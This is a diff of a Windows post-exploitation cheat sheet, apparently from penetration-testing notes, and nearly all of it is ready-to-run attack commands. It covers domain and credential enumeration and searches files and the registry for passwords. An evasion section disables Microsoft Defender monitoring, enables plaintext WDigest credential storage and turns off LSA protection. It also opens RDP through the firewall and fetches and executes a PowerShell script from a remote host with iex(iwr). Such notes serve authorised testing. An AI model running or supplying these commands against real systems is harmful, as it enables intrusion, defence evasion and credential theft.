@@ -45,22 +45,6 @@ nbtscan -r <target range>
 nbtscan -f hosts.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# OS Versions
-
-Windows NT 4                                      4.0
-Windows 2000                                      5.0
-Windows XP                                        5.1
-Windows Server 2003, 2003 R2                      5.2
-Windows Vista, Server 2008                        6.0
-Windows 7, Server 2008 R2                         6.1
-Windows 8, Server 2012                            6.2
-Windows 8.1, Server 2012 R2                       6.3
-Windows 10, Server 2016, Server 2019              10.0
-
-wmic os list brief                                Show info about the OS
-PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Services
 
 PS C:\> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl
@@ -122,30 +106,43 @@ hostname
 whoami
 whoami /groups
 whoami /priv
-systeminfo                                        hostname, OS name and version, domain, and hot fixes
+systeminfo                                        Hostname, OS name and version, domain, and hot fixes
 net share                                         Shared folders
+net session                                       Local sessions
 net users                                         Local users
 net localgroup administrators                     Local administrators
 
 ipconfig /all
-route print
-arp -a
+ipconfig /displaydns
+route print                                       Route table
+arp -a                                            ARP table
 netstat -ano | findstr "LISTEN"
 netstat -ano | findstr "ESTABLISH"
 
-nltest /dclist:<domain>                           Show domain controllers
-nltest /domain_trusts /all_trusts                 Show domain trusts
+doskey /history                                   Command history
+gpresult /z
+
+- Domain
+net localgroup administrators /domain
+net user /domain                                  Domain users
+net view /domain                                  Domain computers
+net user <user> /domain                           Info on a domain user
+net group /domain                                 Domain security groups
+net group "group name" /domain                    Users in a domain security groupt
+nltest /dclist:<domain>                           Domain controllers
+nltest /domain_trusts /all_trusts                 Domain trusts
 
 net group "domain admins" /domain
 net group "enterprise admins" /domain
 net group "Domain Computers" /domain
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
-doskey /history                                   Show command history
-gpresult /z
+# Data mining
 
 dir /s *password* == *cred* == *vnc*
 findstr /si password *.ini *.pdf *.txt *.docx *.xlsx
 reg query HKCU /f password /t REG_SZ /s
+type <file>                                       Read a file
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Evasion
@@ -158,15 +155,9 @@ Set the Severe Threat default action to ‘Allow’.
 Disable Realtime Monitoring.
 Exclude the ‘C:\Windows’ path from scheduled and real-time scanning.
 
-try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}
+PS C:\> try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}
 
-- Allow RDP through the firewall
-netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
-
-- Start Remote Desktop Services
-net start TermService
-
-- Enabled WDigest authentication, this enforces the storage of credentials in plaintext on future logins.
+- Enabled WDigest authentication. This will store new login credentials in plaintext.
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 
 - Disable LSA protection
@@ -231,6 +222,10 @@ iex (iwr -UseBasicParsing http://172.16.219.133/PrivescCheck.ps1); Invoke-Prives
 systeminfo > systeminfo.txt
 Transfer the file to Kali with scp.
 ./wes.py systeminfo.txt
+
+- Allow RDP through the firewall and start the service
+netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
+net start TermService
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Dump the LSASS (Local Security Authority Subsystem Service) process
